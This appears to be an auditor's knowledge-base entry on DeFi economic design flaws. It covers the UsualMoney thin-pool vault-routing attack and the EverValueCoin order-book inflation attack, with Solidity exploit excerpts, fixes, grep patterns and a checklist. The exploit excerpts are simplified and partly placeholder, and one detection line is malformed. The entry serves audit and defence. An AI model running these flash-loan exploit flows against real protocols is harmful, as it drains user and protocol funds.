---
protocol: generic
chain: everychain
category: arbitrage
vulnerability_type: economic_design_flaw

# Pattern Identity (Required)
root_cause_family: missing_validation
pattern_key: economic_design_flaw | pricing_mechanism | economic_exploit | fund_loss

# Interaction Scope
interaction_scope: single_contract

attack_type: economic_exploit
affected_component: pricing_mechanism

primitives:
  - price_discrepancy
  - thin_liquidity_pool
  - order_book_manipulation
  - vault_routing
  - flash_loan_arbitrage
  - market_arbitrage

severity: high
impact: fund_loss
exploitability: 0.7
financial_impact: high

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - "deposit"
  - "swapData"
  - "flashLoan"
  - "cancelOrder"
  - "testExploit"
  - "placeBuyOrder"
  - "executeOperation"
  - "onMorphoFlashLoan"
  - "VaultRouter.deposit"
path_keys:
  - "evervaluecoin"
  - "usualmoney"

tags:
  - arbitrage
  - economic_design
  - price_discrepancy
  - thin_liquidity
  - order_book
  - vault_routing
  - paraswap
  - real_exploit
  - defi
  - DeFiHackLabs

source: DeFiHackLabs
total_exploits_analyzed: 2
total_losses: "$143K"
---

## Economic Arbitrage Design Flaws


## References & Source Reports

| Label | Source | Path / URL |
|-------|--------|------------|
| [EVERVALUECOI-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2025-08/EverValueCoin_exp.sol` |
| [USUALMONEY-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2025-05/UsualMoney_exp.sol` |

---

### Overview

Economic arbitrage design flaws occur when protocol mechanisms create predictable profit opportunities through controllable price discrepancies. Unlike simple oracle manipulation, these exploits target fundamental design weaknesses: vault deposit routes that can be directed through attacker-controlled thin-liquidity pools, or order book mechanisms where artificial orders can be placed to inflate prices before selling on external markets.


### Agent Quick View

| Field | Value |
|-------|-------|
| Root Cause | `missing_validation` |
| Pattern Key | `economic_design_flaw | pricing_mechanism | economic_exploit | fund_loss` |
| Severity | HIGH |
| Impact | fund_loss |
| Interaction Scope | `single_contract` |
| Chain(s) | everychain |

### Valid Bug Signals

- Vault/router deposit accepts arbitrary swap calldata, router target, pool path, or ParaSwap-style payload that can route through attacker-created thin liquidity.
- Protocol trusts an internal order book, quoted route, or self-created market price without depth, TWAP, or external sanity bounds.
- Flash-loaned capital can create the price discrepancy and settle the arbitrage atomically.

### False Positive Guards

- Safe if swap routes are allowlisted, minimum outputs are enforced, and pool liquidity/depth checks reject thin attacker-created pools.
- Not this bug when arbitrage is ordinary market efficiency with no protocol-controlled funds, vault deposits, or trusted price dependency being abused.
- Requires extractable value from protocol users, reserves, or collateral, not merely a price move in an external pool.

### Code Patterns to Look For

```solidity
vault.deposit(amount, swapData); // route target/path fully caller-controlled
paraswap.call(swapData); // no pool allowlist or minOut bound
placeBuyOrder(size, price); // order book price later trusted by settlement
```

### Vulnerability Description

#### Root Cause

1. **Arbitrary Swap Routing via Vault Deposits**: Vault deposit functions accept user-controlled swap routing data (e.g., ParaSwap `swapData`). The attacker creates a thin-liquidity Uniswap V3 pool, provides minimal liquidity, then routes the vault's deposit swap through their pool. The massive price impact lands tokens in the attacker's pool, which they collect as the liquidity provider.

2. **Order Book Price Inflation**: Protocols with on-chain order books allow anyone to place buy orders. An attacker flash-loans capital, places a large artificial buy order that inflates the on-chain "price", then sells the token on an external DEX (e.g., Uniswap V3) where the inflated on-chain price is referenced or creates a perceived price floor.

#### Attack Scenario

**Thin Pool Vault Routing (UsualMoney pattern)**:
1. Create a Uniswap V3 pool (USD0/sUSDS) with minimal liquidity (~10 sUSDS)
2. Flash loan ~1.9M USD0Plus from Morpho Blue
3. Deposit into VaultRouter with ParaSwap swap data routed through the thin pool
4. Massive price impact — attacker collects tokens as LP in the thin pool
5. Arbitrage the price difference via Curve pool (USD0/USD0+)
6. Repay flash loan, profit ~$43K

**Order Book Inflation (EverValueCoin pattern)**:
1. Flash loan WBTC from AAVE
2. Place large buy order on EverValueCoin's on-chain order book (inflates EVA "price")
3. Sell EVA on Uniswap V3 at the now-inflated perception
4. Cancel/unwind the order book position
5. Repay flash loan, profit ~$100K

---

### Vulnerable Pattern Examples

#### Category 1: Arbitrary Vault Deposit Routing [HIGH]

> **pathShape**: `atomic`

**Example 1: UsualMoney — Thin Pool + ParaSwap Routing (2025-05, ~$43K)** [HIGH]
```solidity
// ❌ VULNERABLE: VaultRouter.deposit() accepts arbitrary swap routing data
interface IVaultRouter {
    function deposit(
        IParaSwapAugustus augustus,  // @audit ParaSwap aggregator contract
        address tokenIn,
        uint256 amountIn,
        uint256 minTokensToReceive,
        uint256 minSharesToReceive,
        address receiver,
        bytes calldata swapData      // @audit Arbitrary swap routing — user-controlled
    ) external payable returns (uint256 sharesReceived);
}

// Attack execution from DeFiHackLabs PoC:
function testExploit() public {
    // Step 1: Create a thin-liquidity Uniswap V3 pool
    // @audit Only 10 sUSDS as liquidity — trivially manipulable
    UNI_V3_POS.createAndInitializePoolIfNecessary(
        address(USD0),
        address(sUSDS),
        500,                                    // 0.05% fee tier
        181769597477799861                      // initial sqrtPriceX96
    );
    UNI_V3_POS.mint(INonfungiblePositionManager.MintParams({
        token0: address(sUSDS),
        token1: address(USD0),
        fee: 500,
        tickLower: -887270,
        tickUpper: 887270,
        amount0Desired: 10 * 1e18,   // @audit Only 10 sUSDS — tiny liquidity
        amount1Desired: 0,
        amount0Min: 0,
        amount1Min: 0,
        recipient: address(this),
        deadline: block.timestamp
    }));

    // Step 2: Flash loan ~1.9M USD0Plus
    morphoBlue.flashLoan(address(USD0Plus), 1_900_000 * 1e18, bytes(""));
}

function onMorphoFlashLoan(uint256 amount, bytes calldata) external {
    // Step 3: Deposit USD0Plus into vault — route swap through thin pool
    // @audit swapData encodes: USD0Plus → USD0 → sUSDS via the attacker's thin pool
    VaultRouter.deposit(
        augustus,
        address(USD0Plus),
        amount,
        1,          // minTokensToReceive = 1 (minimal protection)
        0,          // minSharesToReceive = 0
        address(this),
        swapData    // @audit Routes through attacker's thin UniV3 pool
    );
    // @audit Massive swap hits the thin pool → enormous price impact
    // @audit Attacker, as the LP, collects the tokens that flowed through

    // Step 4: Collect LP position from the manipulated pool
    UNI_V3_POS.decreaseLiquidity(
        INonfungiblePositionManager.DecreaseLiquidityParams({
            tokenId: positionTokenId,
            liquidity: fullLiquidity,
            amount0Min: 0,
            amount1Min: 0,
            deadline: block.timestamp
        })
    );
    UNI_V3_POS.collect(collectParams);

    // Step 5: Arbitrage back via Curve pool (normal rates)
    // @audit USD0 ↔ USD0Plus exchange on Curve at fair market price
    USD0USD0Pool.exchange(0, 1, USD0.balanceOf(address(this)), 0, address(this));

    // Step 6: Convert to WETH, repay flash loan
    // Profit: ~$43K
}
```
- **PoC**: `DeFiHackLabs/src/test/2025-05/UsualMoney_exp.sol`
- **Root Cause**: `VaultRouter.deposit()` forwards arbitrary `swapData` to the ParaSwap aggregator without restricting which pools can be used as routing targets. The attacker creates a thin pool and routes the vault's deposit through it, extracting value via price impact.

---

#### Category 2: On-Chain Order Book Price Inflation [HIGH]

> **pathShape**: `atomic`

**Example 2: EverValueCoin — Artificial Order Book Bid (2025-08, ~$100K)** [HIGH]
```solidity
// ❌ VULNERABLE: On-chain order book allows artificial price inflation
// EverValueCoin has an on-chain order book contract

interface IEVAOrderBook {
    function placeBuyOrder(
        uint256 price,
        uint256 amount
    ) external;  // @audit Anyone can place buy orders

    function cancelOrder(uint256 orderId) external;
}

interface IAaveV3 {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

// Attack execution:
function testExploit() public {
    // Step 1: Flash loan WBTC from AAVE
    address[] memory assets = new address[](1);
    assets[0] = address(WBTC);
    uint256[] memory amounts = new uint256[](1);
    amounts[0] = flashLoanAmount;
    aave.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
}

function executeOperation(
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata premiums,
    address initiator,
    bytes calldata params
) external returns (bool) {
    // Step 2: Place large artificial buy order on EVA order book
    // @audit This inflates the perceived on-chain price of EVA
    evaOrderBook.placeBuyOrder(
        inflatedPrice,       // @audit Price much higher than market
        largeAmount          // @audit Large amount to create a "wall"
    );
    // @audit On-chain order book now shows high demand at inflated price

    // Step 3: Sell EVA on Uniswap V3 at "fair" market price
    // @audit Market makers or arb bots see the inflated order book
    // @audit The protocol's own mechanism may reference the order book price
    ISwapRouter(uniV3Router).exactInput(
        ISwapRouter.ExactInputParams({
            path: abi.encodePacked(address(EVA), fee, address(WETH)),
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: evaBalance,
            amountOutMinimum: 0
        })
    );

    // Step 4: Cancel the order book bid (or let it expire)
    evaOrderBook.cancelOrder(orderId);

    // Step 5: Repay flash loan
    WBTC.approve(address(aave), amounts[0] + premiums[0]);
    return true;
    // Profit: ~$100K
}
```
- **PoC**: `DeFiHackLabs/src/test/2025-08/EverValueCoin_exp.sol`
- **Attack TX**: https://arbiscan.io/tx/0xb13b2ab202cb902b8986cbd430d7227bf3ddca831b79786af145ccb5f00fcf3f
- **Root Cause**: EverValueCoin's on-chain order book allows anyone to place buy orders that inflate the perceived price. The attacker uses flash-loaned WBTC to place a large artificial bid, sells EVA on Uniswap at the inflated perception, then cancels the order.

---

### Impact Analysis

#### Technical Impact
- **Controlled Price Impact**: Attackers create pools with minimal liquidity specifically for exploitation
- **Routing Abuse**: Vault deposits routed through attacker-controlled pools extract value via price impact
- **Order Book Manipulation**: Artificial orders inflate virtual prices without actual execution
- **Flash Loan Amplification**: All attacks are capital-free via flash loans

#### Business Impact
- **UsualMoney**: $43K lost — vault routing through thin pool
- **EverValueCoin**: $100K lost — order book price inflation
- **Structural Risk**: Any vault accepting arbitrary swap routing is vulnerable

---

### Secure Implementation

**Fix 1: Restrict Swap Routing to Approved Pools**
```solidity
// ✅ SECURE: Only allow routing through whitelisted pools
mapping(address => bool) public approvedPools;
uint256 public minPoolLiquidity;

function deposit(
    address tokenIn,
    uint256 amountIn,
    bytes calldata swapData
) external returns (uint256) {
    // @audit Decode and validate all pools in the swap route
    address[] memory pools = _decodeRoutePools(swapData);
    for (uint i = 0; i < pools.length; i++) {
        require(approvedPools[pools[i]], "unapproved pool in route");
        // @audit Verify minimum liquidity in each pool
        require(_getPoolLiquidity(pools[i]) >= minPoolLiquidity, "insufficient pool liquidity");
    }

    return _executeDeposit(tokenIn, amountIn, swapData);
}
```

**Fix 2: Maximum Price Impact Check**
```solidity
// ✅ SECURE: Limit price impact of vault deposit swaps
function deposit(bytes calldata swapData, uint256 minOut) external returns (uint256) {
    uint256 preSwapValue = _getOracleValue(tokenIn, amountIn);
    uint256 received = _executeSwap(swapData);

    // @audit Maximum allowed price impact (e.g., 1%)
    uint256 minAcceptable = preSwapValue * (10000 - MAX_IMPACT_BPS) / 10000;
    require(received >= minAcceptable, "excessive price impact");

    return _depositToVault(received, minOut);
}
```

**Fix 3: Order Book Minimum Lock Period**
```solidity
// ✅ SECURE: Prevent flash-loan order book manipulation
mapping(uint256 => uint256) public orderCreatedAt;
uint256 public constant MIN_ORDER_DURATION = 10 minutes;

function placeBuyOrder(uint256 price, uint256 amount) external {
    uint256 orderId = _createOrder(msg.sender, price, amount);
    orderCreatedAt[orderId] = block.timestamp;
}

function cancelOrder(uint256 orderId) external {
    // @audit Prevent same-block or same-tx cancellation
    require(
        block.timestamp >= orderCreatedAt[orderId] + MIN_ORDER_DURATION,
        "order lock period not elapsed"
    );
    _cancelOrder(orderId);
}
```

---

### Detection Patterns

```bash
# Arbitrary swap data in vault/deposit functionsgrep -rn "swapData\|routeData\|swapCalldata" --include="*.sol" | grep "deposit\|vault"

# ParaSwap/1inch integration points
grep -rn "ParaSwap\|Augustus\|OneInchRouter\|0x.*Exchange" --include="*.sol"

# Order book placement functions
grep -rn "function.*placeOrder\|function.*placeBid\|function.*createOrder" --include="*.sol"

# Minimum liquidity checks (or lack thereof)
grep -rn "function.*deposit.*pool\|function.*route" --include="*.sol" | grep -v "minLiquidity\|liquidity.*require"
```

---

### Audit Checklist

1. **Does the vault/protocol accept arbitrary swap routing data?** — Restrict to approved pools/routes
2. **Can users route deposits through self-created pools?** — Enforce minimum liquidity requirements
3. **Is there an on-chain order book?** — Check for flash-loan manipulation of order prices
4. **Can orders be placed and cancelled in the same transaction?** — Add minimum lock periods
5. **Does the protocol reference on-chain "price" from order books?** — Use TWAP or oracle instead
6. **What is the maximum price impact allowed for deposit swaps?** — Enforce explicit limits

---

### Real-World Examples

| Protocol | Date | Loss | Attack Vector | Chain |
|----------|------|------|---------------|-------|
| EverValueCoin | 2025-08 | $100K | Flash-loan → artificial order book bid → sell at inflated price | Arbitrum |
| UsualMoney | 2025-05 | $43K | Create thin UniV3 pool → route vault deposit through it | Ethereum |

---

### DeFiHackLabs PoC References

- **EverValueCoin** (2025-08, $100K): `DeFiHackLabs/src/test/2025-08/EverValueCoin_exp.sol`
- **UsualMoney** (2025-05, $43K): `DeFiHackLabs/src/test/2025-05/UsualMoney_exp.sol`

---

### Keywords

- arbitrage
- economic_design
- price_discrepancy
- thin_liquidity_pool
- vault_routing
- swap_routing
- order_book_manipulation
- paraswap
- flash_loan_arbitrage
- price_inflation
- EverValueCoin
- UsualMoney
- DeFiHackLabs

---

### Related Vulnerabilities

- [Flash Loan Attacks](../../general/flash-loan/) — Capital amplification for arbitrage
- [Oracle Manipulation](../../oracle/) — Price feed manipulation patterns
- [Slippage Vulnerabilities](../../general/validation/slippage-input-validation-vulnerabilities.md) — Swap routing issues
